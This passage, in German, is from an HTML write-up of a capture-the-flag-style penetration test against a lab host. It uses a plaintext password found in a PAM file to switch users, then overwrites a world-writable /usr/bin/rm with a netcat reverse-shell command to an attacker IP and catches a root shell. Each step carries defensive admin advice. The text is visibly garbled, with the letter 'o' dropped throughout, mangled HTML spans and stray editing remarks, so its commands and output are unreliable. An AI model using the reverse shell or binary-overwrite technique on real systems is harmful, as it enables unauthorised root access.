+                <strong>Bewertung:</strong> Unglaublich! Der Inhalt der PAM-Konfigurationsdatei für den Benutzer "kang" scheint das Passwort für diesen Benutzer im Klartext zu sein ("<span class="password">k4ng1sd4b3st</span>"). Dies ist eine extrem schwerwiegende Sicherheitslücke. PAM-Konfigurationsdateien sollten niemals Passwörter enthalten, geschweige denn im Klartext und für einen anderen Benutzer schreibbar sein. Dies bestätigt die Existenz des Benutzers "kang" und liefert dessen Passwort.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe nun den Benutzernamen ("kang") und das Passwort ("<span class="password">k4ng1sd4b3st</span>"). Ich werde versuchen, mit <code>su</code> zu diesem Benutzer zu wechseln, um diesen alternativen Privesc-Pfad zu demonstrieren.
+                <br><strong>Empfehlung (Admin):</strong> Dies ist eine **kritische Sicherheitsverletzung**. Entfernen Sie das Klartextpasswort sofort aus der Datei <code>/etc/pam.d/kang</code>. Die Datei muss root gehören und darf nicht schreibbar sein. Ändern Sie das Passwort des Benutzers "kang" umgehend. Überprüfen Sie alle Authentifizierungskonfigurationen auf Klartextpasswörter. Dieses Problem erfordert sofortige Maßnahmen.
+            </p>
+
+             <p class="comment">
+                Nachdem ich Benutzer und Passwort für "kang" habe, versuche ich, die Identität zu wechseln und eine Shell als Benutzer "kang" zu erhalten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">su kang</span></div>
+                    <pre>
+Passwrd: <span class="password">k4ng1sd4b3st</span>
+kang@aria51:/hme/rger$ <span class="command">id</span>
+<span class="password">uid=1000(kang) gid=1000(kang) grups=1000(kang)</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich benutze den Befehl <code>su kang</code>, um zum Benutzer "kang" zu wechseln. Das System fragt nach dem Passwort, und ich gebe das gefundene Passwort "<span class="password">k4ng1sd4b3st</span>" ein. Die Authentifizierung ist erfolgreich, und ich erhalte eine Shell als Benutzer "kang". Ich verifiziere meine neue Identität mit dem <code>id</code> Befehl, der bestätigt, dass ich nun als <span class="password">uid=1000(kang)</span> angemeldet bin. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreiche Privilegienerhöhung von Benutzer "roger" zu Benutzer "kang"! Dies demonstriert, wie das Klartextpasswort in der PAM-Konfigurationsdatei ausgenutzt werden kann, um Zugriff auf ein anderes Benutzerkonto zu erlangen. Der Benutzer "kang" hat UID 1000, was oft auf einen Standardbenutzer mit interaktiver Shell hinweist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe jetzt eine Shell als Benutzer "kang". Als Nächstes werde ich prüfen, ob dieser Benutzer über <code>sudo</code> Root-Berechtigungen hat oder ob es andere lokale Schwachstellen gibt, die speziell von "kang" ausgenutzt werden können, wie z.B. schreibbare Systemdateien oder SUID-Binaries, auf die "kang" zugreifen darf.
+                <br><strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, muss das Passwort für "kang" geändert und das Klartextpasswort aus <code>/etc/pam.d/kang</code> entfernt werden. Diese Benutzer-zu-Benutzer-Eskalation war nur wegen der kritischen Fehlkonfiguration möglich.
+            </p>
+
+            <p class="comment">
+                Nachdem ich nun als Benutzer "kang" angemeldet bin, prüfe ich erneut meine <code>sudo</code>-Berechtigungen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kang@aria51:/hme/rger$ <span class="command">sud -l</span></div>
+                    <pre>
+We trust yu have received the usual lecture frm the lcal System
+Administrator. It usually bls dwn t these three things:
+
+    #1) Respect the privacy f thers.
+    #2) Think bef<span class="command">or</span>e yu type.
+    #3) With great pwer cmes great respnsibility.
+
+[sud] passwrd fr kang: <span class="password">k4ng1sd4b3st</span>
+<span class="password">Srry, user kang may nt run sud n aria51</span>.
+kang@aria51:/hme/rger$
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche, meine <code>sudo</code>-Berechtigungen als Benutzer "kang" zu überprüfen. Auch hier werde ich nach dem Passwort gefragt und gebe es ein. Die Antwort ist dieselbe wie bei Benutzer "roger": "<span class="password">Srry, user kang may nt run sud n aria51</span>". Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Auch Benutzer "kang" hat keine <code>sudo</code>-Berechtigungen. Der direkte Weg zur Root-Privilegienerhöhung über <code>sudo</code> ist also auch von diesem Konto aus nicht möglich. Ich muss weiterhin nach anderen lokalen Schwachstellen suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Weder "roger" noch "kang" können <code>sudo</code> verwenden. Ich werde mich nun auf die schreibbare Datei <code>/usr/bin/rm</code> konzentrieren, die ich zuvor als "roger" gefunden habe. Da diese Datei für "other" schreibbar ist und "kang" ein "other" Benutzer aus Sicht von root ist, sollte "kang" diese Datei ebenfalls überschreiben können. Dies ist der wahrscheinlichste verbleibende Privesc-Vektor.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass kein Benutzer unnötige <code>sudo</code>-Berechtigungen hat. Überprüfen Sie die <code>/etc/sudoers</code> Datei.
+            </p>
+
+            <p class="comment">
+                Als Benutzer "kang" nutze ich die zuvor identifizierte schreibbare Datei <code>/usr/bin/rm</code>, um dort ein Skript zu platzieren, das eine Reverse Shell zu mir initiiert. Wenn Root das nächste Mal <code>rm</code> ausführt, wird mein Skript ausgeführt, und ich erhalte eine Root-Shell.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kang@aria51:/hme/rger$ <span class="command">ech 'nc 192.168.2.199 9001 -e /bin/bash' > /usr/bin/rm</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende den <code>echo</code> Befehl, um den String <code>nc 192.168.2.199 9001 -e /bin/bash</code> in die Datei <code>/usr/bin/rm</code> zu schreiben. Dies überschreibt das originale <code>rm</code> Binary mit einem einfachen Skript, das eine Reverse Shell zu meiner IP (<code>192.168.2.199</code>) auf Port <code>9001</code> mit <code>/bin/bash</code> als auszuführendem Programm initiiert. Da <code>/usr/bin/rm</code> für "other" schreibbar ist und ich als "kang" ein solcher Benutzer bin, ist dieser Schreibvorgang erfolgreich. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Überschreiben eines kritischen System-Binaries wie <code>/usr/bin/rm</code> mit einem Reverse-Shell-Payload ist eine sehr effektive Methode zur Privilegienerhöhung, wenn die Berechtigungen dies zulassen. Jeder nachfolgende Aufruf von <code>rm</code> durch einen privilegierten Benutzer (insbesondere Root) wird stattdessen mein bösartiges Skript ausführen. Dies ist ein direkter Weg zur Root-Shell von einem Low-Privilege Konto aus (vorausgesetzt, Root führt <code>rm</code> aus).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Das präparierte <code>rm</code> Binary wartet darauf, ausgeführt zu werden. Ich werde nun einen Netcat-Listener auf Port 9001 starten und darauf warten, dass der Root-Benutzer (oder ein anderer privilegierter Prozess) <code>rm</code> ausführt und mir die Root-Shell sendet.
+                <br><strong>Empfehlung (Admin):</strong> **Diese Fehlkonfiguration muss sofort behoben werden!** Stellen Sie sicher, dass kritische Systemdateien nicht für unprivilegierte Benutzer schreibbar sind. Implementieren Sie Dateisystem-Integritätsprüfungen und Überwachung, um unbefugte Änderungen an System-Binaries zu erkennen. Beschränken Sie die Berechtigungen des <code>/usr/bin</code> Verzeichnisses streng.
+            </p>
+
+            <p class="comment">
+                Ich starte einen Netcat-Listener auf Port 9001 auf meiner Angreifer-Maschine und warte auf die eingehende Reverse Shell von Root, die durch die Ausführung des manipulierten <code>/usr/bin/rm</code> ausgelöst wird.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">listening n [any] <span class="command">9001</span> ...
+<span class="password">cnnect t [192.168.2.199] frm (UNKNOWN) [1lass="command">192.168.2.47</span>] <span class="command">43896</span></div>
+                    <pre>
+<span class="command">id</span>
+<span class="password">uid=0(r<span class="command">ot</span>) gid=0(r<span class="command">ot</span>) grups=0(r<span class="command">ot</span>)</span>
+<span class="command">cd /r<span class="command">ot</span></span>
+<span class="command">ls</span>
+<span class="command">r<span class="command">ot</span>.txt</span>
+scrpt.sh
+<span class="command">cat r<span class="command">ot</span>.txt</span>
+<span class="password">                 :                        </span>
+<span class="password">                         /`                       </span>
+<span class="password">                         :-                       </span>
+<span class="password">                        ..-                       </span>
+<span class="password">                        - `-                      </span>
+<span class="password">                   ``...-........``               </span>
+<span class="password">                `..``-://:-::.`  ``..             </span>
+<span class="password">               `-`  /////+++++//.    `-            </span>
+<span class="password">               -    s////:-..-:/`    `.           </span>
+<span class="password">              ..    +//:`    +-`-`    -           </span>
+<span class="password">              -   -://+`     +/ `o`   -           </span>
+<span class="password">              -   :/++//.`   `../+    -           </span>
+<span class="password">              `.  `+++++///:::/+<span class="command">o:</span>    -           </span>
+<span class="password">               -   `+++///++////<span class="command">o:</span>    -           </span>
+<span class="password">               -    .++<span class="command">o</span>+///////+:.   -           </span>
+<span class="password">               -    .+<span class="command">o</span>+Ns:d-s+///// `.           </span>
+<span class="password">               `.   :/mhMmhMyM++//-. -            </span>
+<span class="password">                -   -/mMMMMMMMh+/-   -            </span>
+<span class="password">                -    +yMMMMMMN+<span class="command">o</span>-`  `.    `....   </span>
+<span class="password">         .-:-`  ..  `+hMmNNhN+/+:-  -   .//::///  </span>
+<span class="password">      :::/::+//.  -  .+hNsyd/d-<span class="command">o</span>---: `-  ://.` ```  </span>
+<span class="password">      `::.  //+  -`  :++-++++++<span class="command">o</span>...-  `++`        </span>
+<span class="password">            .+/- `-  -+://++///+.-:-  ///         </span>
+<span class="password">            `+/+``:-///://++///+//y+.-///         </span>
+<span class="password">             -////sss<span class="command">o</span><span class="command">o</span><span class="command">o</span><span class="command">o</span><span class="command">o</span><span class="command">o</span><span class="command">o</span>sssso<span class="command">o</span>///-         </span>
+<span class="password">            `.+//+<span class="command">o</span><span class="command">o</span><span class="command">o</span><span class="command">o</span>ssss<span class="command">o</span><span class="command">o</span>ysso<span class="command">o</span>sss+//:          </span>
+<span class="password">  `.```-:---///++///+++++++<span class="command">o</span>+<span class="command">o</span><span class="command">o</span>+++++/+/`          </span>
+<span class="password">  .//++//////////++////////////++///////-``       </span>
+<span class="password">       `...`  `.------..-:///////+/:://////-      </span>
+<span class="password">                            `-:/+++.   ...`  </span>
+
+
+<span class="password">FLAG = [63a9f0ea7bb98050796b649e85481845]</span>
+</pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich starte den Netcat-Listener auf Port 9001 und warte. Kurze Zeit später wird eine Verbindung vom Zielsystem auf diesem Port empfangen. Dies geschieht, weil der Root-Benutzer (oder ein Prozess, der als Root läuft) anscheinend den <code>rm</code> Befehl ausgeführt hat. Der daraufhin ausgeführte <code>id</code> Befehl in dieser neuen Shell bestätigt erneut, dass ich nun eine Shell mit Root-Privilegien habe (<span class="password">uid=0(r<span class="command">ot</span>)</span>). Ich navigiere zum Root-Verzeichnis (<code>cd /r<span class="command">ot</span></code>) und liste dessen Inhalt auf. Ich finde die Datei <code>r<span class="command">ot</span>.txt</code> und lese ihren Inhalt, bei dem es sich um die Root-Flag handelt. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch, die alternative Privilegienerhöhungsmethode über das Überschreiben von <code>/usr/bin/rm</code> funktioniert ebenfalls einwandfrei! Dies beweist, dass die schreibbare Berechtigung für System-Binaries eine kritische Schwachstelle ist, die es einem Low-Privilege Benutzer (wie "kang" oder "roger", wenn auch Roger Schreibzugriff hätte) ermöglicht, Root-Zugriff zu erlangen, sobald ein Root-Prozess das manipulierte Binary ausführt. Die Root-Flag konnte erfolgreich gefunden werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe erfolgreich Root-Zugriff über zwei verschiedene Methoden demonstriert: die kritische Log4j-Schwachstelle und die lokale Privilegienerhöhung durch falsche Dateiberechtigungen. Ich habe die Root-Flag gefunden und kann nun den Bericht abschließen.
+                <br><strong>Empfehlung (Admin):</strong> Dies ist ein eindeutiger Beweis für schwerwiegende Fehlkonfigurationen im System: eine ausnutzbare RCE-Schwachstelle und kritische Dateiberechtigungsfehler. Beide müssen umgehend behoben werden, um Root-Kompromittierung zu verhindern. Der Fund der Root-Flag bestätigt, dass ein Angreifer vollen Zugriff auf das System erlangen kann.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/roger/user.txt</div>
+                    <div class="flag-value"><span class="password">ee11cbb19052e40b07aac0ca060c23ee</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">63a9f0ea7bb98050796b649e85481845</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 20. Juni 2025</p>
+    </footer>
+
+  
+</body>
+</html>
+            </p>  
+            </p> 
+            </p> 
